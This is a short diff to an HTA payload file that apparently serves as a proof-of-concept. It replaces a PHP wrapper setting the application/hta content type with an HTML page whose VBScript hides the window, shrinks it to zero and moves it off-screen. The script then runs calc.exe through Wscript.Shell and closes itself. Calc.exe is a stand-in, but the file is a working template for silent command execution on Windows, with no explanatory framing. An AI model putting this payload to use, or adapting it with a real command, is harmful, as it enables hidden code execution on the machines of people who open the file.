@@ -1,7 +1,15 @@
-<?php
-    header("Content-type: application/hta");
-?>
+<HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD> 
 <script language="VBScript">
-      Set shell = CreateObject("Wscript.Shell")
-      shell.Run "calc.exe"
-	  </script>
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "calc.exe"
+self.close
+</script>
+<body>
+demo
+</body>
+</HEAD> 
+</HTML> 
